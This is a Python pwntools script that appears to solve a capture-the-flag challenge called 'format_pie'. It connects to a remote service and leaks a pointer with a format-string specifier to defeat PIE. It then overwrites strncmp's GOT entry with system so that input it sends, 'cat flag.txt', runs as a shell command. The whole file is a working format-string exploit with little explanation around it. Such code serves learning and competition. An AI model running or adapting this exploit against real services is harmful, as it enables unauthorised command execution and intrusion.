#!/usr/bin/env python3
from pwn import *
import time

exe = ELF("./format_pie")
context.binary = exe
context.log_level = 'debug'

# Connect to challenge
r = remote("34.93.66.31", 50712)

# Receive banner and first prompt
data = r.recvuntil(b"> ")

# Step 1: Leak PIE Base
r.sendline(b"%41$p")
time.sleep(0.5)

# Read everything until next prompt
data = r.recvuntil(b"> ", timeout=2)

# Find the hex address in the response
import re
match = re.search(rb'0x[0-9a-f]+', data)
if match:
    leak = int(match.group(), 16)
else:
    log.error("Could not find leak!")
    r.close()
    exit(1)

log.info(f"Leaked address: {hex(leak)}")

# Calculate base
exe.address = leak - 0x134d
log.info(f"PIE Base: {hex(exe.address)}")

# Step 2: Overwrite strncmp@got with system@plt
payload = fmtstr_payload(6, {exe.got['strncmp']: exe.plt['system']})
r.sendline(payload)

# Wait for and receive all the format string output
time.sleep(2)
data = r.recv(timeout=2)
log.info(f"Received {len(data)} bytes after payload")

# Now wait for prompt
r.recvuntil(b"> ", timeout=2)

# Step 3: Trigger shell
r.sendline(b"cat flag.txt")
time.sleep(0.5)

# Try to get output
data = r.recv(timeout=2)
print(f"FINAL OUTPUT: {data}")

r.close()
